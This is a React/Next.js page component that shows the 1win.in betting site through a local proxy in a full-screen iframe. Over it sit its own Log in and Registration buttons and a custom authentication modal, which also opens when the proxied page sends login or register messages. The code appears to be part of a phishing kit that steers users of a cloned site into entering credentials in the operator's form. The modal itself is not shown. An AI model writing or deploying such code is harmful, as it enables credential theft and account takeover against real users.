'use client';

import { useState, useEffect, useRef } from 'react';
import AuthModal from './login';

export default function Home() {
  const [modalOpen, setModalOpen] = useState(false);
  const [authMode, setAuthMode] = useState<'login' | 'register'>('login');
  const iframeRef = useRef<HTMLIFrameElement>(null);

  const openAuth = (mode: 'login' | 'register') => {
    setAuthMode(mode);
    setModalOpen(true);
  };

  // Listen for messages from the proxied page inside the iframe
  useEffect(() => {
    const handler = (e: MessageEvent) => {
      if (!e.data) return;
      if (e.data === 'open-login-modal' || e.data.type === 'open-login-modal' || e.data === 'login') {
        openAuth('login');
      } else if (
        e.data === 'open-register-modal' ||
        e.data.type === 'open-register-modal' ||
        e.data === 'register' ||
        e.data === 'registration'
      ) {
        openAuth('register');
      }
    };
    window.addEventListener('message', handler);
    return () => window.removeEventListener('message', handler);
  }, []);

  return (
    <>
      {/* Full-viewport iframe showing the proxied 1win.in site */}
      <iframe
        ref={iframeRef}
        src="/api/proxy?url=https://1win.in"
        style={{
          position: 'fixed',
          inset: 0,
          width: '100%',
          height: '100%',
          border: 'none',
          zIndex: 1,
        }}
        title="1win"
      />

      {/* Floating Header Actions Overlay: Log in & Registration */}
      <div className="win-site-topbar" role="toolbar" aria-label="Account Actions">
        <button
          type="button"
          className="win-topbar-btn win-topbar-btn--login"
          onClick={() => openAuth('login')}
          id="win-top-login-btn"
        >
          Log in
        </button>
        <button
          type="button"
          className="win-topbar-btn win-topbar-btn--register"
          onClick={() => openAuth('register')}
          id="win-top-register-btn"
        >
          Registration
        </button>
      </div>

      {/* Unified Login & Registration Overlay Modal */}
      <AuthModal
        isOpen={modalOpen}
        onClose={() => setModalOpen(false)}
        initialMode={authMode}
      />
    </>
  );
}
